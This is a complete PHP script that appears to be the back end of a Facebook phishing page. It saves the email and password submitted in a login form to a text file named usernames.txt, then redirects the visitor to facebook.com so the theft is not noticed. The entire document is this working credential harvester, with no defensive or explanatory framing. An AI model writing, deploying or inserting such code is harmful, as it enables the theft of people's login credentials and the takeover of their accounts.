<?php

file_put_contents("usernames.txt", "\n"."Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
